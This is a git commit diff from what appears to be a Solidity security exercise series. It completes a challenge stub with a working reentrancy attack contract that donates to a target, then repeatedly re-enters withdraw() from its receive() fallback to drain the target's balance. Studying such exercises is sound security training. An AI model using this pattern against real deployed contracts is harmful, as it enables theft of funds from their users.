0ea5b465709d728b909c5cde4bef6c34e59c3a33
Abhi Gulati <abhi@indeed.com>
2022-05-15 16:07:16 -0500

    Solve Reentrance

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -1,15 +1,26 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Reentrance.sol";
+import "hardhat/console.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    Reentrance private reentanceContract;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        reentanceContract = Reentrance(contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        reentanceContract.donate{value: 1}(address(this));
+
+        reentanceContract.withdraw();
+    }
+
+    receive() external payable {
+        if (address(contractAddress).balance > 0) {
+            reentanceContract.withdraw();
+        }
     }
 }
